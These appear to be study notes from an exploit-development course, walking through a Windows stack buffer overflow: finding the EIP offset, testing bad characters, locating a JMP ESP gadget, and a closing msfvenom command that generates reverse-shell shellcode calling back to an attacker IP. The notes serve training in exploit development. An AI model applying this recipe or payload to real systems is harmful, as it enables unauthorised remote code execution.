# Locating the crash
Generate the pattern with KALI or online.
Put the pattern as payload and detect the offset of the crash.
Once the offset is located, fill with As.

msf-pattern_create -l 2600

When crashing, EIP will have a certain value.
Copy the value to obtain the exact offset:
msf-pattern_offset -l 2600 -q "TBD_EIP"

NOTE that the offset given by the tool DOES NOT COVER EIP.
You will have to add 4 bytes after that offset to cover EIP.

Once we add the buffer + the offset to cover EIP, it's turn to know where our shellcode is stored. Let's put some Cs, and see where ESP points:
dds esp 
dds esp-4
dds esp-8
dds esp-10
Until we don't see CS:
![](content/images/post_images/osed_1.png)

We know esp-8, then 8. We check it
![](content/images/post_images/osed_1_1.png)
Now badchars.

```
badchars = ( b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

db esp Lff to show all the bytes and see if any is affected:
![](content/images/post_images/osed_1_2.png)
Delete badchars if applicable. See if any of them is missing and repeat the step.

Now we have to find a JMP ESP ADDRESS in any DLL. Remember:
- That address must not contain badchars -> 
- The JMP ESP must not be in a read only section. If the DLL has DEP, .data is executable and we can use that address.

We want the opcode of the JMP ESP instruction. 
In KALI, execute msf-nasm_shell and introduce jmp esp.
The value is FFE4

Then we see all modules with lmD
and then we get our module with lm m "TBD_module_name"
We should see the start and end address and confirm there are no badchars(remember, zeros are only bad at left)

Then we search for the FFE4 (JMP ESP) instruction in that range:
s -b START END 0xff 0xe4

If we get an ocurrence, we confirm that the address does not contain badchars:
![](content/images/post_images/osed_1_4.png)

EIP will have to point to that address. Remember to put the address in little endian:
eip = b"\xcf\x10\x80\x14" # 0x148010cf

![](content/images/post_images/osed_1_5.png)

Generate msfvenom payload with badchars:
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
Note that you can put the EXITFUNC=thread parameter so that only exits the thread and not the whole program when the shellcode is executed.
